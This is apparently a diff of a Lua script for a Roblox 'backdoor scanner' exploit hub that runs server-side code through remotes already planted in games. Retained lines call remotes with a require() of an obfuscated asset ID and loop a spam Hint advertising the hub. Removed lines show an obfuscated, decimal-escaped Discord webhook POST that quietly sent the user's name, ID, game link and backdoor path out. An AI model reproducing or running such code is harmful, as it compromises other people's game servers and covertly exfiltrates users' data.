@@ -1569,20 +1569,11 @@ local script = G2L["20"];
 	
 	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/**qzx*7*5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
-						request({
-							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',
-							Method = 'POST',
-							Headers = {
-								['Content-Type'] = 'application/json',
-							},
-							Body = HttpService:JSONEncode({
-								username='pls dont delete this w3bh00k',
-								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
-							})
+						
 						})
 					end
 	
@@ -1607,10 +1598,7 @@ local script = G2L["20"];
 			debug('Protected backdoor found', 3)
 			spawn(function()
 				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a) end)
-				if variantValue~=nil then
-					local splited=string.split(variantValue,':')
-					notify(splited[#splited])
-				end
+				
 			end)
 		else
 			runRemote(backdoor, a)
